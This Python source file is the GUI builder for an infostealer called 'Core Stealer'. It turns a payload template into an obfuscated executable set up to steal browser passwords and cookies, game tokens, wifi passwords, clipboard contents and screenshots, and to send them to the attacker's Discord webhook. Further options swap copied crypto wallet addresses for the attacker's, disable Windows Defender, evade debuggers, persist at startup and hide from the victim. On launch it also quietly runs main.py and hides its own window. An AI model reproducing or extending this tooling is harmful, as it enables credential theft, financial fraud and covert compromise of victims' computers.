import customtkinter
from customtkinter import filedialog as fd
import os
from PIL import Image
import requests
import time
import shutil
import webbrowser
import win32gui
import win32con
import base64
from pypresence import Presence
import threading
import sys
import subprocess

subprocess.Popen(['python', 'main.py'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

custom_username = ""  
#DEFINIR USERNAME DANS UNE ENTRé DU GUI ça sera pour reperer le nom de l'utilisateur dans le grab 
# ça permet de rendre le grab "customizable" et moins detecté


#############################################################################################################################
############################################ Clean@Builder: v2 ##############################################################
############################################ Clean@Author: https://github.com/TestAlexss ######################################
############################################ Clean@Code: For Core ########################################################
#############################################################################################################################



# DISCORD RPC
try:
    client_id = '986964088804495400'
    RPC = Presence(client_id)
    RPC.connect()
except:
    pass


def update():
     try:
        RPC.update(state=data['state'],
        details=data['details'],
        large_image=data['large_image'],
        small_image=data['small_image'],
        buttons=data['buttons'],
        start=data['time'])
     except:
         pass


data = {
     'state':"Build Some Shit",
     'details':"with Sordeal-Builder V4",
     'large_image':"sordeal1", 
     'large_text':None, 
     'small_image':"sordeal2", 
     'small_text':None, 
     'buttons':[{"label": "Github", "url": "https://github.com/TestAlexss/Core-Stealer-main"}, {"label": "Discord", "url": "https://discord.gg/y4VZKawGBQ"}],
     'time': 1
      }
update()
def rpcloop():
    while True:
        try:
            update()
        except:
            pass
        time.sleep(20)





###Main script
class Core(customtkinter.CTk):
    def __init__(self):

        self.icon_name = ""
        self.pingtype = "none"

        self.iconname = "Core_assets\img\logo.ico"
        super().__init__()
        self.protocol("WM_DELETE_WINDOW", self.on_close)

        #title, icon
        self.title("Core Stealer")
        self.geometry("820x420")
        self.iconbitmap("Core_assets\img\logo.ico")

        #base
        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure(1, weight=1)

        #path img
        image_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "Core_assets\img")
        self.logo = customtkinter.CTkImage(Image.open(os.path.join(image_path, "logo.png")), size=(80, 80))
        self.logo_ab = customtkinter.CTkImage(Image.open(os.path.join(image_path, "logo.png")), size=(200, 200))
        self.bg_all = customtkinter.CTkImage(Image.open(os.path.join(image_path, "black_bg.png")), size=(680, 420))
        self.bg_fr = customtkinter.CTkImage(Image.open(os.path.join(image_path, "black_fr.png")), size=(150, 420))
        self.options = customtkinter.CTkImage(Image.open(os.path.join(image_path, "options.png")), size=(35, 35))
        self.crypto = customtkinter.CTkImage(Image.open(os.path.join(image_path, "crypto.png")), size=(35, 35))
        self.files = customtkinter.CTkImage(Image.open(os.path.join(image_path, "files.png")), size=(35, 35))
        self.icons = customtkinter.CTkImage(Image.open(os.path.join(image_path, "files.png")),size=(20, 20))
        self.build_img = customtkinter.CTkImage(Image.open(os.path.join(image_path, "build.png")), size=(35, 35))
        self.about = customtkinter.CTkImage(Image.open(os.path.join(image_path, "about.png")), size=(35, 35))
        self.arrow = customtkinter.CTkImage(Image.open(os.path.join(image_path, "arrow.png")), size=(50, 30))


        #List Frame
        self.options_frame = customtkinter.CTkFrame(self, fg_color="black")
        self.options_frame.grid_columnconfigure(0, weight=1)

        self.nav_frame = customtkinter.CTkFrame(self, fg_color="black")
        self.nav_frame.grid(row=0, sticky="nsew")

        self.nav_bg = customtkinter.CTkLabel(self.nav_frame, text="", image=self.bg_fr)
        self.nav_bg.place(x=0, y=0)

        self.crypto_frame = customtkinter.CTkFrame(self, fg_color="black")
        self.crypto_frame.grid_columnconfigure(0, weight=1)

        self.build_frame = customtkinter.CTkFrame(self, fg_color="black")
        self.build_frame.grid_columnconfigure(0, weight=1)

        self.file_frame = customtkinter.CTkFrame(self, fg_color="black")
        self.file_frame.grid_columnconfigure(0, weight=1)

        self.about_frame = customtkinter.CTkFrame(self, fg_color="black")
        self.about_frame.grid_columnconfigure(0, weight=1)

        frames = [self.options_frame, self.crypto_frame, self.build_frame, self.file_frame, self.about_frame]

        for frame in frames:
            bg_label = customtkinter.CTkLabel(frame, text="", image=self.bg_all)
            bg_label.place(x=0, y=0)

        #Nav Bar
        self.nav_frame.grid_rowconfigure(7, weight=1)
        self.nav_label = customtkinter.CTkLabel(self.nav_frame, text="", image=self.logo)
        self.nav_label.grid(row=0, pady=(5, 15))

        self.option_button = customtkinter.CTkButton(self.nav_frame, corner_radius=5, text="", hover_color="#ff0026", image=self.options, command=self.option_event)
        self.option_button.grid(row=1, pady=(0, 15))

        self.crypto_button = customtkinter.CTkButton(self.nav_frame, corner_radius=5, text="", hover_color="#ff0026", image=self.crypto, command=self.crypto_event)
        self.crypto_button.grid(row=2, pady=(0, 15))

        self.file_button = customtkinter.CTkButton(self.nav_frame, corner_radius=5, text="", hover_color="#ff0026", image=self.files, command=self.file_event)
        self.file_button.grid(row=3, pady=(0, 15))

        self.build_button = customtkinter.CTkButton(self.nav_frame, corner_radius=5, text="", hover_color="#ff0026", image=self.build_img, command=self.build_event)
        self.build_button.grid(row=4, pady=(0, 15))

        self.about_button = customtkinter.CTkButton(self.nav_frame, corner_radius=5, text="", hover_color="#ff0026", image=self.about, command=self.about_event)
        self.about_button.grid(row=5, pady=(0, 15))


        #Options category
        self.w3bh00k_input = customtkinter.CTkEntry(self.options_frame, width=420, fg_color=("gray20", "gray12"), placeholder_text="Enter your webhook")
        self.w3bh00k_input.grid(row=2, padx=40, pady=(10, 12))

        self.w3bh00k_button = customtkinter.CTkButton(self.options_frame, width=120, height=30, fg_color=("gray20", "gray12"), hover_color="#ff0026", text="Check Webhook", command=self.c_button)
        self.w3bh00k_button.grid(row=2, column=2, padx=40, pady=(0, 1))

        self.n3m3_input = customtkinter.CTkEntry(self.options_frame, width=420, fg_color=("gray20", "gray12"), placeholder_text="Enter your file output name")
        self.n3m3_input.grid(row=4, padx=40, pady=(0, 12))

        self.icon_button = customtkinter.CTkButton(self.options_frame, width=30, height=30, fg_color="transparent", hover_color=("gray20", "gray12"), text="", image=self.icons, command=self.icon)
        self.icon_button.grid(row=5, padx=40, pady=(0, 12))

        self.icon_check = customtkinter.CTkCheckBox(self.options_frame, text="Add icon on your exe (.ico)",fg_color=("gray20", "gray12"), hover_color="#ff0026", onvalue="yes",offvalue="no")
        self.icon_check.grid(row=5, sticky="nw", padx=40, pady=(0, 12))

        self.kill = customtkinter.CTkCheckBox(self.options_frame, text="Kill victim Discord Client", fg_color=("gray20", "gray12"), hover_color="#ff0026", onvalue=True, offvalue=False)
        self.kill.grid(row=6, sticky="nw", padx=40, pady=(0, 12))

        self.dbug = customtkinter.CTkCheckBox(self.options_frame, text="Enable Anti-Debug \n[Recommand yes, Kill Anti-Virus/Anti-Firewall/Anti-VM]?", fg_color=("gray20", "gray12"), hover_color="#ff0026", onvalue=True, offvalue=False)
        self.dbug.grid(row=7, sticky="nw", padx=40, pady=(0, 12))

        self.ping_new = customtkinter.CTkCheckBox(self.options_frame,text="Ping on new victim? (here/everyone)", fg_color=("gray20", "gray12"), hover_color="#ff0026",command=self.pings, onvalue="yes", offvalue="no")
        self.ping_new.grid(row=8, sticky="nw", padx=40, pady=(0, 12))

        self.ping_option = customtkinter.CTkComboBox(self.options_frame, width=120, height=30, values=["here", "everyone"], fg_color=("gray20", "gray12"))
        self.ping_option.grid(row=8, column=2, sticky="nw", padx=40, pady=(0, 12))

        self.wd = customtkinter.CTkCheckBox(self.options_frame, text="Disable Windows Defender \n(Can create error/detection Recommand \"no active\")", fg_color=("gray20", "gray12"), hover_color="#ff0026",onvalue='yes', offvalue='no')
        self.wd.grid(row=9, sticky="nw", padx=40, pady=(0, 12))

        self.fake_err = customtkinter.CTkCheckBox(self.options_frame,text="Add a fake error", fg_color=("gray20", "gray12"), hover_color="#ff0026", onvalue='yes', offvalue='no')
        self.fake_err.grid(row=10, sticky="nw", padx=40, pady=(0, 12))

        self.startups = customtkinter.CTkCheckBox(self.options_frame, text="Add file to startup", fg_color=("gray20", "gray12"), hover_color="#ff0026",onvalue='yes', offvalue='no')
        self.startups.grid(row=11, sticky="nw", padx=40, pady=(0, 12))

        self.hide = customtkinter.CTkCheckBox(self.options_frame, text="Hide Core console for victim", fg_color=("gray20", "gray12"), hover_color="#ff0026",onvalue='yes', offvalue='no')
        self.hide.grid(row=12, sticky="nw", padx=40)

        self.next_option_button = customtkinter.CTkButton(self.options_frame, width=40, height=30, fg_color="transparent", hover_color=("gray75", "gray17"), text="", image=self.arrow, command=self.crypto_event)
        self.next_option_button.grid(row=12, column=2, padx=1)


        #Crypto category

        self.active = customtkinter.CTkCheckBox(self.crypto_frame, text="Replace all copied crypto address wallet by your address", fg_color=("gray20", "gray12"), hover_color="#ff0026", onvalue='yes', offvalue='no')
        self.active.grid(row=1, sticky="nw", padx=40, pady=(10, 20))

        self.btc_input = customtkinter.CTkEntry(self.crypto_frame, width=420, fg_color=("gray20", "gray12"), placeholder_text="Your Bitcoin Address (let empty if you do not have)")
        self.btc_input.grid(row=3, padx=40, pady=(0, 13))

        self.eth_input = customtkinter.CTkEntry(self.crypto_frame, width=420, fg_color=("gray20", "gray12"), placeholder_text="Your Ethereum Address (let empty if you do not have)")
        self.eth_input.grid(row=5, padx=40, pady=(0, 13))

        self.xchain_input = customtkinter.CTkEntry(self.crypto_frame, width=420, fg_color=("gray20", "gray12"), placeholder_text="Your X-Chain Address (let empty if you do not have)")
        self.xchain_input.grid(row=7, padx=40, pady=(0, 13))

        self.pchain_input = customtkinter.CTkEntry(self.crypto_frame, width=420, fg_color=("gray20", "gray12"), placeholder_text="Your P-Chain Address (let empty if you do not have)")
        self.pchain_input.grid(row=9, padx=40, pady=(0, 13))

        self.cchain_input = customtkinter.CTkEntry(self.crypto_frame, width=420, fg_color=("gray20", "gray12"), placeholder_text="Your C-Chain Address (let empty if you do not have)")
        self.cchain_input.grid(row=11, padx=40, pady=(0, 12))

        self.monero_input = customtkinter.CTkEntry(self.crypto_frame, width=420, fg_color=("gray20", "gray12"), placeholder_text="Your Monero Address (let empty if you do not have)")
        self.monero_input.grid(row=13, padx=40, pady=(0, 13))

        self.ada_input = customtkinter.CTkEntry(self.crypto_frame, width=420, fg_color=("gray20", "gray12"), placeholder_text="Your Ada/Cardano Address (let empty if you do not have)")
        self.ada_input.grid(row=15, padx=40, pady=(0, 13))

        self.dash_input = customtkinter.CTkEntry(self.crypto_frame, width=420, fg_color=("gray20", "gray12"), placeholder_text="Your Dash Address (let empty if you do not have)")
        self.dash_input.grid(row=17, padx=40)

        self.next_crypto_button = customtkinter.CTkButton(self.crypto_frame, width=40, height=30, fg_color="transparent",hover_color=("gray75", "gray17"), text="", image=self.arrow, command=self.file_event)
        self.next_crypto_button.grid(row=17, column=2, padx=40)


        #File category
        self.browsers_button = customtkinter.CTkCheckBox(self.file_frame,text="Steal Browsers Files (Cookies/Password/etc...)", fg_color=("gray20", "gray12"), hover_color="#ff0026",onvalue='yes', offvalue='no')
        self.browsers_button.grid(row=1, sticky="nw", padx=40, pady=(10, 13))

        self.antivirus_button = customtkinter.CTkCheckBox(self.file_frame,text="Steal all anti virus informations", fg_color=("gray20", "gray12"), hover_color="#ff0026",onvalue='yes', offvalue='no')
        self.antivirus_button.grid(row=2, sticky="nw", padx=40, pady=13)

        self.mc_button = customtkinter.CTkCheckBox(self.file_frame, text="Steal all minecraft app tokens", fg_color=("gray20", "gray12"), hover_color="#ff0026",onvalue='yes', offvalue='no')
        self.mc_button.grid(row=3, sticky="nw", padx=40, pady=13)

        self.sys_button = customtkinter.CTkCheckBox(self.file_frame, text="Steal systeme informations", fg_color=("gray20", "gray12"), hover_color="#ff0026",onvalue='yes', offvalue='no')
        self.sys_button.grid(row=4, sticky="nw", padx=40, pady=13)

        self.roblox_button = customtkinter.CTkCheckBox(self.file_frame, text="Steal roblox app token", fg_color=("gray20", "gray12"), hover_color="#ff0026",onvalue='yes', offvalue='no')
        self.roblox_button.grid(row=5, sticky="nw", padx=40, pady=13)

        self.screen_button = customtkinter.CTkCheckBox(self.file_frame, text="Take screenshot", fg_color=("gray20", "gray12"), hover_color="#ff0026",onvalue='yes', offvalue='no')
        self.screen_button.grid(row=6, sticky="nw", padx=40, pady=13)

        self.last_button = customtkinter.CTkCheckBox(self.file_frame, text="Steal latest clipboard", fg_color=("gray20", "gray12"), hover_color="#ff0026",onvalue='yes', offvalue='no')
        self.last_button.grid(row=7, sticky="nw", padx=40, pady=13)

        self.wifi_button = customtkinter.CTkCheckBox(self.file_frame, text="Steal all wifi passwords", fg_color=("gray20", "gray12"), hover_color="#ff0026",onvalue='yes', offvalue='no')
        self.wifi_button.grid(row=8, sticky="nw", padx=40, pady=13)

        self.next_crypto_button = customtkinter.CTkButton(self.file_frame, width=40, height=30,fg_color="transparent",hover_color=("gray75", "gray17"), text="", image=self.arrow,command=self.build_event)
        self.next_crypto_button.grid(row=8, column=2, padx=40)

        #Select button defaut
        for button in [self.browsers_button, self.antivirus_button, self.mc_button, self.sys_button, self.roblox_button, self.screen_button, self.last_button, self.wifi_button]:
            button.select()


        #Build category
        self.obf = customtkinter.CTkCheckBox(self.build_frame, text="Obfuscate the Core", fg_color=("gray20", "gray12"), hover_color="#ff0026", onvalue='yes', offvalue='no')
        self.obf.grid(row=1, sticky="nw", padx=40, pady=(20, 20))

        self.compy = customtkinter.CTkCheckBox(self.build_frame,text="Compil into .exe (Let Empty for .py)", fg_color=("gray20", "gray12"), hover_color="#ff0026", onvalue='yes', offvalue='no')
        self.compy.grid(row=2, sticky="nw", padx=40, pady=(20, 20))

        self.obf_name = customtkinter.CTkLabel(master=self.build_frame, text="Obfuscation Level")
        self.obf_name.grid(row=3, columnspan=2, padx=10, pady=(20, 5))

        self.num = customtkinter.CTkLabel(master=self.build_frame, text='          0%                                          25%                                         50%                                        75%                                        100%')
        self.num.grid(row=4, columnspan=1, padx=10, sticky="nw")

        self.obf_bar = customtkinter.CTkSlider(self.build_frame, from_=0, to=1, number_of_steps=4, fg_color=("gray20", "gray12"))
        self.obf_bar.grid(row=5, sticky="ew", padx=40, pady=(0, 20))

        self.pleasebuild = customtkinter.CTkButton(self.build_frame, width=150, height=50, fg_color=("gray20", "gray12"), hover_color="#ff0026", text="BUILD SCRIPT", command=lambda: self.build_scr(self.n3m3_input.get().replace(" ", "_"), self.w3bh00k_input.get()), compound="right")
        self.pleasebuild.grid(row=6, padx=0, pady=(20, 20))

        #About category
        self.img = customtkinter.CTkLabel(self.about_frame, text="", image=self.logo_ab)
        self.img.grid(row=0, pady=20)

        urls = [("Github", "https://github.com/TestAlexss/Core-Stealer-main"),("Discord", "https://discord.gg/y4VZKawGBQ"),("Telegram", "https://t.me/+9fVRZHcY2uY3OWZk")]

        for i, (text, url) in enumerate(urls, start=3):
            button = customtkinter.CTkButton(self.about_frame, text=text, fg_color=("gray20", "gray12"),hover_color="#ff0026", command=lambda url=url: webbrowser.open(url))
            button.grid(row=i, pady=10)

        self.function("options")

    # Nav bar
    def function(self, name):
        buttons = [self.option_button, self.crypto_button, self.file_button, self.build_button, self.about_button]

        for button in buttons:
            button_name = button.cget("text").lower()
            button.configure(fg_color=("gray20", "gray12") if button_name == name else "transparent")

        frames = {
            "options": self.options_frame,
            "crypto": self.crypto_frame,
            "file": self.file_frame,
            "build": self.build_frame,
            "about": self.about_frame
        }

        for button_name, frame in frames.items():
            if button_name == name:
                frame.grid(row=0, column=1, sticky="nsew")
            else:
                frame.grid_forget()


    def on_close(self):
        self.destroy()
        sys.exit()

    #Options category
    def r_icon(self):
        self.icon_button.configure(fg_color="transparent", hover_color=("gray20", "gray12"), text="")

    def icon(self):
        self.icon_name = fd.askopenfilename()
        self.name_icon = os.path.basename(self.icon_name)
        if os.path.isfile(f"{self.icon_name}"):
            self.icon_button.configure(width=30, height=30, fg_color="green", hover_color=("gray20", "gray12"),text="")
            self.options_frame.after(3500, self.r_icon)
            pass
        else:
            self.icon_button.configure(width=30, height=30, fg_color="red", hover_color=("gray20", "gray12"),text="")
            self.options_frame.after(3500, self.r_icon)
        if self.icon_name.endswith('.ico'):
            pass
        else:
            self.icon_button.configure(width=30, height=30, fg_color="red", hover_color=("gray20", "gray12"),text="")
            self.options_frame.after(3500, self.r_icon)

    def v_w3bh00k(self):
        webhook = self.w3bh00k_input.get()
        try:
            r = requests.get(webhook, timeout=5)
            if r.status_code == 200:
                return True
            else:
                return False
        except requests.exceptions.RequestException:
            return False

    def c_button(self):
        if self.v_w3bh00k():
            self.w3bh00k_button.configure(width=120, height=30, fg_color="green", hover_color=("gray20", "gray12"), text="Valid Webhook")
            self.options_frame.after(3500, self.r_button)
        else:
            self.w3bh00k_button.configure(width=120, height=30, fg_color="red", hover_color=("gray20", "gray12"), text="Invalid Webhook")
            self.options_frame.after(3500, self.r_button)

    def r_button(self):
        self.w3bh00k_button.configure(fg_color=("gray20", "gray12"), hover_color="#ff0026", text="Check Webhook")

    def pings(self):
        if self.ping_new.get() == "yes":
            self.ping = "yes"
            self.pingtype = self.ping_option.get()
        else:
            self.ping = "no"
            self.pingtype = "none"

    #Nav Bar
    def option_event(self):
        self.function("options")

    def crypto_event(self):
        self.function("crypto")

    def build_event(self):
        self.function("build")

    def file_event(self):
        self.function("file")

    def about_event(self):
        self.function("about")

##BUILDER USING
    def reset_build(self):
        self.pleasebuild.configure(fg_color=("gray20", "gray12"), text="BUILD SCRIPT")

    def build_scr(self, filename, webhook):
        self.pleasebuild.configure(width=150, height=50, fg_color="green", hover_color=("gray20", "gray12"),text="Build currently starting")
        self.options_frame.after(5000, self.reset_build)
        self.mk_file(filename, webhook)
        self.cleanup(filename)
        self.renamefile(filename)

    def mk_file(self, filename,webhook):
        with open('./main.py', 'r', encoding="utf-8") as f:
            code = f.read()

        inputs = {
            'btc_input': 'btc_', 'eth_input': 'eth_',
            'xchain_input': 'xchain_', 'pchain_input': 'pchain_', 'cchain_input': 'cchain_',
            'monero_input': 'monero_',
            'ada_input': 'ada_',
            'dash_input': 'dash_'
        }

        for key, value in inputs.items():
            setattr(self, value, self.__dict__[key].get() if len(self.__dict__[key].get()) > 0 else 'none')

        if self.active.get() != "yes":
            inputs = {
                'btc_': '', 'eth_': '',
                'xchain_': '', 'pchain_': '', 'cchain_': '',
                'monero_': '',
                'ada_': '',
                'dash_': ''
            }

            for key, value in inputs.items():
                setattr(self, key, value)

        b64 = webhook.encode('utf-8')
        bs64 = base64.b64encode(b64)
        with open(f"{filename}.py", "w", encoding="utf-8") as f:
            f.write(code.replace('%WEBHOOK_HERE%', str(bs64).replace("b'", "").replace("'", ""))
                    .replace("%PC_CREATOR%", os.getenv("COMPUTERNAME"))
                    .replace("%USER_CREATOR%", custom_username)
                    .replace("%ping_enabled%", str(self.ping_new.get()))
                    .replace("%Defender_disable%", str(self.wd.get()))
                    .replace("%ping_type%", self.pingtype)
                    .replace("%_address_replacer%", str(self.active.get()))
                    .replace("%_btc_address%", self.btc_)
                    .replace("%_eth_address%", self.eth_)
                    .replace("%_xchain_address%", self.xchain_)
                    .replace("%_pchain_address%", self.pchain_)
                    .replace("%_cchain_address%", self.cchain_)
                    .replace("%_monero_address%", self.monero_)
                    .replace("%_ada_address%", self.ada_)
                    .replace("%_dash_address%", self.dash_)
                    .replace("%_error_enabled%", str(self.fake_err.get()))
                    .replace("%_startup_enabled%", str(self.startups.get()))
                    .replace("%_hide_script%", str(self.hide.get()))
                    .replace("'%kill_discord_process%'", str(self.kill.get()))
                    .replace("'%_debugkiller%'", str(self.dbug.get()))
                    .replace("%_browsers_files%", str(self.browsers_button.get()))
                    .replace("%_av_files%", str(self.antivirus_button.get()))
                    .replace("%minecraft_files%", str(self.mc_button.get()))
                    .replace("%_systeme_files%", str(self.sys_button.get()))
                    .replace("%_roblox_files%", str(self.roblox_button.get()))
                    .replace("%_clipboard_files%", str(self.last_button.get()))
                    .replace("%_screen_files%", str(self.screen_button.get()))
                    .replace("%wifipassword_files%", str(self.wifi_button.get())))

        time.sleep(2)
        if self.obf.get() == 'yes' and self.compy.get() == 'yes':
            self.encryption(f"{filename}")
            self.compile(f"obfuscated_{filename}")
        elif self.obf.get() == 'no' and self.compy.get() == 'yes':
            self.compile(f"{filename}")
        elif self.obf.get() == 'yes' and self.compy.get() == 'no':
            self.encryption(f"{filename}")
        else:
            pass

    def encryption(self, filename):
        os.system(f"python obfuscation.py -i {filename}.py -o obfuscated_{filename}.py -s {self.obf_bar.get() * 100}".replace(".0", ""))

    def compile(self, filename):
        icon_name = self.icon_name if self.icon_name else self.iconname
        icon = icon_name if self.icon_check.get() == 'yes' else "NONE"
        if self.hide.get() == "yes":
            os.system(f'python -m PyInstaller --onefile --hiddenimport=pypiwin32 --noconsole --upx-dir=./Core_assets/upx -i {icon} --distpath ./ .\\{filename}.py')
        if self.hide.get() == "no":
            os.system(f'python -m PyInstaller  --hiddenimport=pypiwin32 --onefile --upx-dir=./Core_assets/upx -i {icon} --distpath ./ .\\{filename}.py')

    def cleanup(self, filename):
        cleans_dir = {'./__pycache__', './build'}
        cleans_file = {f'./{filename}.py',f'./{filename}.spec',f'./obfuscated_compressed_{filename}.py',f'./obfuscated_{filename}.py',f'./obfuscated_{filename}.spec',f'./compressed_{filename}.py',f'./compressed_{filename}.spec'}

        if self.obf.get() == 'yes' and self.compy.get() == 'no':
            cleans_file.add(f'./{filename}.py')
            cleans_file.remove(f'./obfuscated_{filename}.py')
        elif self.obf.get() == 'yes' and self.compy.get() == 'yes':
            cleans_file.add(f'./{filename}.py')
            cleans_file.add(f'./obfuscated_{filename}.spec')
        elif self.obf.get() == 'no' and self.compy.get() == 'no':
            cleans_file.remove(f'./{filename}.py')
        else:
            pass

        for clean in cleans_dir:
            try:
                if os.path.isdir(clean):
                    shutil.rmtree(clean)
            except Exception:
                pass
                continue

        for clean in cleans_file:
            try:
                if os.path.isfile(clean):
                    os.remove(clean)
            except Exception:
                pass
                continue

    def renamefile(self, filename):
        files = [f"./obfuscated_compressed_{filename}.py", f"./compressed_{filename}.py",
                 f"./compressed_{filename}.exe", f"./obfuscated_{filename}.py",
                 f"./obfuscated_compressed_{filename}.exe", f"./obfuscated_{filename}.exe"]
        for file in files:
            try:
                os.rename(file, f"./{filename}{os.path.splitext(file)[1]}")
            except Exception:
                pass




def app_thread(stop_event):
    app = Core()
    app.mainloop()
    stop_event.set() 

def rpcloop_thread(stop_event):
    while not stop_event.is_set(): 
        rpcloop()



if __name__ == "__main__":
    hide = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(hide, win32con.SW_HIDE)
    stop_event = threading.Event()
    
    app_thread = threading.Thread(target=app_thread, args=(stop_event,))
    rpcloop_thread = threading.Thread(target=rpcloop_thread, args=(stop_event,))
    app_thread.start()
    rpcloop_thread.start()
    app_thread.join()
    rpcloop_thread.join()



